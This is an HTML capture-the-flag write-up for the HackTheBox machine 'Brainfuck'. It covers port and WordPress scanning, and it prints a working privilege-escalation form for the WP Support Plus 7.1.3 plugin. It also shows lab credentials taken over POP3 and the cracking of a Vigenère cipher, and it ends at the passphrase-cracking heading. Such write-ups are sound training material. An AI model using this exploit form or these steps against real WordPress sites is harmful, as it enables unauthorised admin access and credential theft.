@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Brainfuck</strong></h1>
+        <em>Released: 29th April 2017 / Pwned: 20th September 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Brainfuck is made of many steps. The initial entry up to the super secret forum is relatively straightforward, but both challenges from that point on rely on cracking encryption.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Run <code>wpscan</code> against brainfuck.htb to find installed plugins<br>
+        • Exploit the <code>WP Support Plus Responsive Ticket System 7.1.3</code> plugin with priv-esc vuln to login as admin<br>
+        • Retrieve orestis's email password from the Easy WP SMTP settings<br>
+        • Log in to orestis's email and find credentials to sup3rs3cr3t.brainfuck.htb<br>
+        • Crack the vigenere cipher orestis is using to talk to the admin<br>
+        • Crack the id_rsa passphrase with ssh2john and john, and log in as orestis using the ssh key and passphrase<br>
+        • Use the p, q and e values in debug.txt to crack the encrypted root.txt in output.txt with <code>user13741</code>'s script - <a href="https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e">https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e</a><br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Find all TCP ports:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.17</code><br>
+        Service detection and script scan open TCP ports:<br>
+        <code>nmap -p 22,25,110,143,443 -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.17</code><br>
+        <br>
+        -T4 aggressive scan<br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/brainfuck#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/brainfuck#&nbsp;nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-allports.txt&nbsp;10.10.10.17<br>
+                [..]<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                22/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssh<br>
+                25/tcp&nbsp;&nbsp;open&nbsp;&nbsp;smtp<br>
+                110/tcp&nbsp;open&nbsp;&nbsp;pop3<br>
+                143/tcp&nbsp;open&nbsp;&nbsp;imap<br>
+                443/tcp&nbsp;open&nbsp;&nbsp;https<br>
+                <br>
+                root@gotham:~/ctf/brainfuck#&nbsp;nmap&nbsp;-p&nbsp;22,25,110,143,443&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-openports.txt&nbsp;10.10.10.17<br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.2p2&nbsp;Ubuntu&nbsp;4ubuntu2.1&nbsp;(Ubuntu&nbsp;Linux;&nbsp;protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02&nbsp;(ED25519)<br>
+                25/tcp&nbsp;&nbsp;open&nbsp;&nbsp;smtp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Postfix&nbsp;smtpd<br>
+                |_smtp-commands:&nbsp;brainfuck,&nbsp;PIPELINING,&nbsp;SIZE&nbsp;10240000,&nbsp;VRFY,&nbsp;ETRN,&nbsp;STARTTLS,&nbsp;ENHANCEDSTATUSCODES,&nbsp;8BITMIME,&nbsp;DSN,&nbsp;<br>
+                110/tcp&nbsp;open&nbsp;&nbsp;pop3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dovecot&nbsp;pop3d<br>
+                |_pop3-capabilities:&nbsp;SASL(PLAIN)&nbsp;UIDL&nbsp;RESP-CODES&nbsp;AUTH-RESP-CODE&nbsp;TOP&nbsp;USER&nbsp;CAPA&nbsp;PIPELINING<br>
+                143/tcp&nbsp;open&nbsp;&nbsp;imap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dovecot&nbsp;imapd<br>
+                |_imap-capabilities:&nbsp;IDLE&nbsp;post-login&nbsp;more&nbsp;capabilities&nbsp;listed&nbsp;OK&nbsp;have&nbsp;IMAP4rev1&nbsp;Pre-login&nbsp;ENABLE&nbsp;LITERAL+&nbsp;LOGIN-REFERRALS&nbsp;AUTH=PLAINA0001&nbsp;SASL-IR&nbsp;ID<br>
+                443/tcp&nbsp;open&nbsp;&nbsp;ssl/http&nbsp;nginx&nbsp;1.10.0&nbsp;(Ubuntu)<br>
+                |_http-server-header:&nbsp;nginx/1.10.0&nbsp;(Ubuntu)<br>
+                |_http-title:&nbsp;Welcome&nbsp;to&nbsp;nginx!<br>
+                |&nbsp;ssl-cert:&nbsp;Subject:&nbsp;commonName=brainfuck.htb/organizationName=Brainfuck&nbsp;Ltd./stateOrProvinceName=Attica/countryName=GR<br>
+                |&nbsp;Subject&nbsp;Alternative&nbsp;Name:&nbsp;DNS:www.brainfuck.htb,&nbsp;DNS:sup3rs3cr3t.brainfuck.htb<br>
+                |&nbsp;Not&nbsp;valid&nbsp;before:&nbsp;2017-04-13T11:19:29<br>
+                |_Not&nbsp;valid&nbsp;after:&nbsp;&nbsp;2027-04-11T11:19:29<br>
+                |_ssl-date:&nbsp;ERROR:&nbsp;Script&nbsp;execution&nbsp;failed&nbsp;(use&nbsp;-d&nbsp;to&nbsp;debug)<br>
+                |&nbsp;tls-alpn:&nbsp;<br>
+                |_&nbsp;&nbsp;http/1.1<br>
+                |&nbsp;tls-nextprotoneg:&nbsp;<br>
+                |_&nbsp;&nbsp;http/1.1<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Analysis of results:<br>
+        • <strong>22/ssh</strong> - Nothing can be done with ssh for the time being, but useful to know for later<br>
+        • <strong>25/smtp, 110/pop3, 143/imap</strong> - Email is running, but without credentials we can't access anything<br>
+        • <strong>443/https</strong> - A website! And the only port worth examining for the time being. Note that Nmap also found 2 domain names by reading the SSL certificate - <code>brainfuck.htb</code> and <code>sup3rs3cr3t.brainfuck.htb</code><br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 443/https</strong></h2><br>
+        Add the domain names Nmap found to your <code>/etc/hosts</code> file so that you can access them.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/brainfuck#&nbsp;nano&nbsp;/etc/hosts<br>
+                [...]<br>
+                10.10.10.17&nbsp;brainfuck.htb<br>
+                10.10.10.17&nbsp;sup3rs3cr3t.brainfuck.htb
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) https://10.10.10.17</strong></h3><br>
+        <code>https://10.10.10.17</code> is an nginx default install page.<br>
+        Gobuster doesn't find anything.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>2b) https://sup3rs3cr3t.brainfuck.htb</strong></h3><br>
+        <a href="https://sup3rs3cr3t.brainfuck.htb">https://sup3rs3cr3t.brainfuck.htb</a> is a forum.<br>
+        Gobuster finds a few results, but to go any further we need login credentials.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>2c) https://brainfuck.htb</strong></h3><br>
+        <code>https://brainfuck.htb</code> is a WordPress site, with nothing much on it.<br>
+        Notice that the user <code>admin</code> has posted the <code>Dev Update</code> post.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        Considering it's a WordPress site, run <code>wpscan</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/brainfuck/brainfuck.htb#&nbsp;wpscan&nbsp;--url&nbsp;https://brainfuck.htb&nbsp;--disable-tls-checks<br>
+                _______________________________________________________________<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_______&nbsp;&nbsp;&nbsp;_____<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/&nbsp;/&nbsp;&nbsp;__&nbsp;\&nbsp;/&nbsp;____|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;\&nbsp;&nbsp;/\&nbsp;&nbsp;/&nbsp;/|&nbsp;|__)&nbsp;|&nbsp;(___&nbsp;&nbsp;&nbsp;___&nbsp;&nbsp;__&nbsp;_&nbsp;_&nbsp;__&nbsp;®<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;\/&nbsp;&nbsp;\/&nbsp;/&nbsp;|&nbsp;&nbsp;___/&nbsp;\___&nbsp;\&nbsp;/&nbsp;__|/&nbsp;_`&nbsp;|&nbsp;'_&nbsp;\<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;/\&nbsp;&nbsp;/&nbsp;&nbsp;|&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;____)&nbsp;|&nbsp;(__|&nbsp;(_|&nbsp;|&nbsp;|&nbsp;|&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;&nbsp;\/&nbsp;&nbsp;&nbsp;|_|&nbsp;&nbsp;&nbsp;&nbsp;|_____/&nbsp;\___|\__,_|_|&nbsp;|_|<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WordPress&nbsp;Security&nbsp;Scanner&nbsp;by&nbsp;the&nbsp;WPScan&nbsp;Team<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Version&nbsp;3.6.3<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sponsored&nbsp;by&nbsp;Sucuri&nbsp;-&nbsp;https://sucuri.net<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@_WPScan_,&nbsp;@ethicalhack3r,&nbsp;@erwan_lr,&nbsp;@_FireFart_<br>
+                _______________________________________________________________<br>
+                <br>
+                [+]&nbsp;URL:&nbsp;https://brainfuck.htb/<br>
+                [...]<br>
+                <br>
+                [+]&nbsp;wp-support-plus-responsive-ticket-system<br>
+                &nbsp;|&nbsp;Location:&nbsp;https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/<br>
+                &nbsp;|&nbsp;Last&nbsp;Updated:&nbsp;2019-09-03T07:57:00.000Z<br>
+                &nbsp;|&nbsp;[!]&nbsp;The&nbsp;version&nbsp;is&nbsp;out&nbsp;of&nbsp;date,&nbsp;the&nbsp;latest&nbsp;version&nbsp;is&nbsp;9.1.2<br>
+                &nbsp;|<br>
+                &nbsp;|&nbsp;Detected&nbsp;By:&nbsp;Urls&nbsp;In&nbsp;Homepage&nbsp;(Passive&nbsp;Detection)<br>
+                &nbsp;|<br>
+                &nbsp;|&nbsp;[!]&nbsp;4&nbsp;vulnerabilities&nbsp;identified:<br>
+                &nbsp;|<br>
+                &nbsp;|&nbsp;[!]&nbsp;Title:&nbsp;WP&nbsp;Support&nbsp;Plus&nbsp;Responsive&nbsp;Ticket&nbsp;System&nbsp;&lt;=&nbsp;7.1.3&nbsp;–&nbsp;Authenticated&nbsp;SQL&nbsp;Injection<br>
+                &nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Fixed&nbsp;in:&nbsp;8.0.0<br>
+                &nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;References:<br>
+                &nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;https://wpvulndb.com/vulnerabilities/8699<br>
+                &nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;https://www.exploit-db.com/exploits/40939/<br>
+                &nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;http://lenonleite.com.br/en/blog/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/<br>
+                &nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system<br>
+                &nbsp;|<br>
+                [...]<br>
+                &nbsp;|<br>
+                &nbsp;|&nbsp;Version:&nbsp;7.1.3&nbsp;(100%&nbsp;confidence)<br>
+                &nbsp;|&nbsp;Detected&nbsp;By:&nbsp;Readme&nbsp;-&nbsp;Stable&nbsp;Tag&nbsp;(Aggressive&nbsp;Detection)<br>
+                &nbsp;|&nbsp;&nbsp;-&nbsp;https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt<br>
+                &nbsp;|&nbsp;Confirmed&nbsp;By:&nbsp;Readme&nbsp;-&nbsp;ChangeLog&nbsp;Section&nbsp;(Aggressive&nbsp;Detection)<br>
+                &nbsp;|&nbsp;&nbsp;-&nbsp;https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt<br>
+                <br>
+                [..]
+            </div>
+        </div><br>
+        <br>
+        <code>wpscan</code> finds that a plugin installed is vulnerable - <code>wp-support-plus-responsive-ticket-system</code>.<br>
+        The authenticated SQL injection won't work because we don't have credentials, but if you google for further exploits of the 7.1.3 version of the plugin, you'll find an exploitdb entry - <a href="https://www.exploit-db.com/exploits/41006">https://www.exploit-db.com/exploits/41006</a><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) WordPress Ticket System 7.1.3 - Privilege Escalation</strong></h2><br>
+        <a href="https://www.exploit-db.com/exploits/41006">https://www.exploit-db.com/exploits/41006</a><br>
+        <br>
+        Modify the proof of concept in the article to send a request to <code>brainfuck.htb</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/brainfuck/brainfuck.htb#&nbsp;nano&nbsp;privesc.html<br>
+                &lt;!--&nbsp;WP&nbsp;Support&nbsp;Plus&nbsp;Responsive&nbsp;Ticket&nbsp;System&nbsp;7.1.3&nbsp;Privilege&nbsp;Escalation&nbsp;--&gt;<br>
+                &lt;html&gt;<br>
+                &lt;form&nbsp;method="post"&nbsp;action="https://brainfuck.htb/wp-admin/admin-ajax.php"&gt;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Username:&nbsp;&lt;input&nbsp;type="text"&nbsp;name="username"&nbsp;value="administrator"&gt;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type="hidden"&nbsp;name="email"&nbsp;value="sth"&gt;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type="hidden"&nbsp;name="action"&nbsp;value="loginGuestFacebook"&gt;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type="submit"&nbsp;value="Login"&gt;<br>
+                &lt;/form&gt;<br>
+                &lt;/html&gt;
+            </div>
+        </div><br>
+        <br>
+        Open the exploit form in your browser (you can drag and drop the file into firefox as a tab).<br>
+        <br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        Enter <code>admin</code> as the username, and <code>Login</code>.<br>
+        You should get authenticated!<br>
+        <br>
+        Go back to <a href="https://brainfuck.htb">https://brainfuck.htb</a> and you should see that you're logged in as <code>admin</code>.<br>
+        Hover over Brainfuck Ltd. and access the Dashboard<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) WordPress Dashboard - SMTP</strong></h2><br>
+        We can't get a shell from the dashboard because we don't have write access to any of the web pages.<br>
+        Instead, check the settings of the <code>Easy WP SMTP</code> plugin.<br>
+        <br>
+        Plugins &gt; Installed Plugins &gt; Easy WP SMTP Settings<br>
+        <br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        Here, you'll find the password for orestis's email saved in the form.<br>
+        You can read the password from the source - Hightlight the password &gt; Right click &gt; Inspect Element.<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        We have login credentials for Orestis' email:<br>
+        <code>orestis@brainfuck.htb<br>
+        kHGuERB29DNiNE</code><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) 110/pop3 - Orestis's Email</strong></h2><br>
+        Use the credentials above to log in to Orestis's email over port 110.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/brainfuck/25#&nbsp;telnet&nbsp;10.10.10.17&nbsp;110<br>
+                Trying&nbsp;10.10.10.17...<br>
+                Connected&nbsp;to&nbsp;10.10.10.17.<br>
+                Escape&nbsp;character&nbsp;is&nbsp;'^]'.<br>
+                +OK&nbsp;Dovecot&nbsp;ready.<br>
+                USER&nbsp;orestis<br>
+                +OK<br>
+                PASS&nbsp;kHGuERB29DNiNE<br>
+                +OK&nbsp;Logged&nbsp;in.<br>
+                LIST<br>
+                +OK&nbsp;2&nbsp;messages:<br>
+                1&nbsp;977<br>
+                2&nbsp;514<br>
+                .<br>
+                RETR&nbsp;2<br>
+                +OK&nbsp;514&nbsp;octets<br>
+                Return-Path:&nbsp;&lt;root@brainfuck.htb&gt;<br>
+                X-Original-To:&nbsp;orestis<br>
+                Delivered-To:&nbsp;orestis@brainfuck.htb<br>
+                Received:&nbsp;by&nbsp;brainfuck&nbsp;(Postfix,&nbsp;from&nbsp;userid&nbsp;0)<br>
+                id&nbsp;4227420AEB;&nbsp;Sat,&nbsp;29&nbsp;Apr&nbsp;2017&nbsp;13:12:06&nbsp;+0300&nbsp;(EEST)<br>
+                To:&nbsp;orestis@brainfuck.htb<br>
+                Subject:&nbsp;Forum&nbsp;Access&nbsp;Details<br>
+                Message-Id:&nbsp;&lt;20170429101206.4227420AEB@brainfuck&gt;<br>
+                Date:&nbsp;Sat,&nbsp;29&nbsp;Apr&nbsp;2017&nbsp;13:12:06&nbsp;+0300&nbsp;(EEST)<br>
+                From:&nbsp;root@brainfuck.htb&nbsp;(root)<br>
+                <br>
+                Hi&nbsp;there,&nbsp;your&nbsp;credentials&nbsp;for&nbsp;our&nbsp;"secret"&nbsp;forum&nbsp;are&nbsp;below&nbsp;:)<br>
+                <br>
+                username:&nbsp;orestis<br>
+                password:&nbsp;kIEnnfEKJ#9UmdO<br>
+                <br>
+                Regards<br>
+                .
+            </div>
+        </div><br>
+        <br>
+        Great! We know have credentials to access the sup3rs3cret forum :)<br>
+        <code>username: orestis<br>
+        password: kIEnnfEKJ#9UmdO</code><br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) https://sup3rs3cr3t.brainfuck.htb</strong></h2><br>
+        Log in to the site using <code>orestis</code>'s credentials.<br>
+        You'll now be able to view 2 previously hidden forum posts - <code>SSH Access</code> and <code>Key</code>.<br>
+        <br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        In <code>SSH Access</code>, orestis asks the admin for his ssh key.<br>
+        <code>Key</code> is the encrypted chat orestis opens to retrieve his key from the admin.<br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>6a) Identify encryption</strong></h3><br>
+        If you look at <code>SSH Access</code>, you'll see that orestis signs all of their messages with <code>Orestis - Hacking for fun and profit</code><br>
+        <img alt="images\2-11.png" src="images/2-11.png"><br>
+        <br>
+        If you check <code>Key</code>, despite the encryption, you'll recognise that they're still signing their messages with the same phrase<br>
+        <img alt="images\2-12.png" src="images/2-12.png"><br>
+        <br>
+        However, <code>Orestis - Hacking for fun and profit</code> is different every time.<br>
+        This means that this is either a caesar cipher, but every forum post has different key, OR that this is a vigenere cipher, and that orestis' signature is different every time because the number of characters in each message is different.<br>
+        <br>
+        A caesar cipher that changes every post wouldn't a friendly way for 2 users to communicate, so it's most likely a vigenere cipher.<br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>6b) Crack Vigenere Cipher - Find Key Length with Frequency Analysis</strong></h3><br>
+        To crack a vigenere cipher, you need to find the key length.<br>
+        To find the key length, you have to find a sequence/string within the cipher text that repeats.<br>
+        You then calculate the difference between the start of the 1st string and the start of the 2nd, which will give you your key length.<br>
+        <br>
+        In <code>admin</code>'s forum post where he links the URL<br>
+            <div class="codebox">
+                Ybgbq&nbsp;wpl&nbsp;gw&nbsp;lto&nbsp;udgnju&nbsp;fcpp,&nbsp;C&nbsp;jybc&nbsp;zfu&nbsp;zrryolqp&nbsp;zfuz&nbsp;xjs&nbsp;rkeqxfrl&nbsp;ojwceec&nbsp;J&nbsp;uovg<br>
+                mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr
+            </div>
+        </div><br>
+        there's a repetition - <strong><code>zfu z</code></strong><code>rryolqp</code> <strong><code>zfuz</code></strong> <code>xjs</code>.<br>
+        <br>
+        <code>zfuz</code> repeats twice.<br>
+        <br>
+        The difference between the <code>z</code> in the first <code>zfuz</code> and the start of second <code>zfuz</code> is 11 characters, which means that this vigenere key is 11 characters long.<br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>6c) Crack Vigenere Cipher - Brute-force possible keys</strong></h3><br>
+        The next step, after discovering the key length, is to brute-force characters in the key using a known bit of ciphertext.<br>
+        <br>
+        <code>zfu</code> is a 3 letter word.<br>
+        <code>zfuz</code> is a 4 letter word.<br>
+        The first 3 letters in both words are the same.<br>
+        <br>
+        To brute-force <code>zfuz</code>, we need to find a 3 and 4 letter word where the first 3 letters in both words are the same.<br>
+        I checked this website - <a href="https://www3.nd.edu/~busiforc/handouts/cryptography/cryptography%20hints.html">https://www3.nd.edu/~busiforc/handouts/cryptography/cryptography%20hints.html</a> - and found 2 options:<br>
+        <br>
+        <code>you</code> and <code>your</code><br>
+        <code>the</code> and <code>they</code><br>
+        <br>
+        Excellent! Now we just need to brute-force a key.<br>
+        You could write a python script, but I used GCHQ's Cyber Chef - <a href="https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('')&input=emZ1eg">https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('')&amp;input=emZ1eg</a><br>
+        <br>
+        I started with <code>your</code>, and tried every letter in the alphabet until <code>z</code> translated to <code>y</code>, and then brute-forced the next character until <code>f</code> translated to <code>o</code>, etc.<br>
+        <br>
+        <code>bra</code> decodes <code>zfu</code> to <code>you</code>.<br>
+        <code>brai</code> decodes <code>zfuz</code> to <code>your</code>.<br>
+        <br>
+        You've successfully decoded <code>zfuz</code> to <code>your</code>, and found the first 4 letters of key!<br>
+        <br>
+        However, at this point you're stuck, with no other characters left to decode.<br>
+        To continue, we need another known bit of cipher text.<br>
+        Looking at the encrypted messages, there are some identifiable strings:<br>
+        • <code>mnvze://</code> = <code>https</code><br>
+        • <code>/sp_ptr</code> = <code>id_rsa</code><br>
+        • <code>/frmfycu</code> = <code>orestis</code><br>
+        • Orestis - Hacking for fun and profit<br>
+        ◇ <code>Pieagnm - Jkoijeg nbw zwx mle grwsnn</code><br>
+        ◇ <code>Wejmvse - Fbtkqal zqb rso rnl cwihsf</code><br>
+        ◇ <code>Qbqquzs - Pnhekxs dpi fca fhf zdmgzt</code><br>
+        <br>
+        <code>brai</code> doesn't successfully decode <code>mnvze://</code> to <code>https://</code>, try another known string.<br>
+        <code>sp_ptr</code> doesn't decode to <code>id_rsa</code>.<br>
+        <br>
+        The problem is that our key is position dependant (if that's the right term?).<br>
+        As in, our key is 11 characters long, but the message is, for example, 50 characters long.<br>
+        The key will encode the first 11 characters of the message, but once it reaches the 12th character in the message, the key will cycle back and use the first character in the key again.<br>
+        <br>
+        <code>mnvze</code> and <code>sp_ptr</code> are all different points in the message, not at the start, which means that the key and message don't line up.<br>
+        <br>
+        Try <code>Pieagnm - Jkoijeg nbw zwx mle grwsnn</code>.<br>
+        <code>brai</code> decodes the string to this - <code>Oresfwm - Bjxibdp ntv iwp lue yqfsfm</code><br>
+        <br>
+        The first 4 decoded letters are correct - <code>Ores</code>, which means that <code>brai</code> decoded the string correctly.<br>
+        We've, luckily, found a bit of ciphertext that lines up with our key.<br>
+        <br>
+        We can now use the rest of the string - <code>Pieagnm - Jkoijeg nbw zwx mle grwsnn</code> - to brute-force the rest of the key.<br>
+        <br>
+        As before, try every letter in the alphabet (and maybe a little bit of educated guesswork) until the key decodes <code>Pieagnm - Jkoijeg nbw zwx mle grwsnn</code> to <code>Orestis - Hacking for fun and profit</code> correctly.<br>
+        <br>
+        brai<br>
+        brain<br>
+        brainf<br>
+        brainfu<br>
+        brainfuc<br>
+        brainfuck<br>
+        brainfuckm<br>
+        brainfuckmy<br>
+        <br>
+        <code>brainfuckmy</code> is 11 characters long, and decodes the entire string correctly!<br>
+        <img alt="images\2-13.png" src="images/2-13.png"><br>
+        <br>
+        However, when translating the entire message, we get gibberish.<br>
+        <img alt="images\2-14.png" src="images/2-14.png"><br>
+        <br>
+        This is because the key isn't in the correct order.<br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>6d) Re-order Key</strong></h3><br>
+        <code>brainfuckmy</code> correctly decodes from <code>Pieagnm</code> onwards.<br>
+        <code>Pieagnm</code> is 28 characters into the message.<br>
+            <div class="codebox">
+                Mya&nbsp;qutf&nbsp;de&nbsp;buj&nbsp;otv&nbsp;rms&nbsp;dy&nbsp;srd&nbsp;vkdof<br>
+                Pieagnm&nbsp;-&nbsp;Jkoijeg&nbsp;nbw&nbsp;zwx&nbsp;mle&nbsp;grwsnn
+            </div>
+        </div><br>
+        <br>
+        To find which characters need shifting around in the key, calculate how many times the key length (11) fits into 28, and subtract the difference.<br>
+        <br>
+        11 + 11 = 22<br>
+        28 - 22 = 6<br>
+        <br>
+        The last 6 characters of the key need moving.<br>
+        Take the last 6 letters of the key and move them to the start.<br>
+        <br>
+        The correct of the key is - <code>fuckmybrain</code><br>
+        <img alt="images\2-15.png" src="images/2-15.png"><br>
+        <br>
+        <a id="h3-9" name="h3-9"></a><strong></strong>
+        <h3><strong>6e) Decode URL</strong></h3><br>
+        With the key to cipher, we can decode the message containg the URL!<br>
+            <div class="codebox">
+                Ybgbq&nbsp;wpl&nbsp;gw&nbsp;lto&nbsp;udgnju&nbsp;fcpp,&nbsp;C&nbsp;jybc&nbsp;zfu&nbsp;zrryolqp&nbsp;zfuz&nbsp;xjs&nbsp;rkeqxfrl&nbsp;ojwceec&nbsp;J&nbsp;uovg<br>
+                mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr
+            </div>
+        </div><br>
+        <br>
+        <img alt="images\2-16.png" src="images/2-16.png"><br>
+        <br>
+            <div class="codebox">
+                There&nbsp;you&nbsp;go&nbsp;you&nbsp;stupid&nbsp;fuck,&nbsp;I&nbsp;hope&nbsp;you&nbsp;remember&nbsp;your&nbsp;key&nbsp;password&nbsp;because&nbsp;I&nbsp;dont<br>
+                https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+            </div>
+        </div><br>
+        <br>
+        If you translate the rest of the messages, you'll also see that Orestis is going to brute-force his ssh passphrase, which hints at what needs to be done next.<br>
+        <img alt="images\2-17.png" src="images/2-17.png"><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) Brute-force id_rsa passphrase</strong></h2><br>
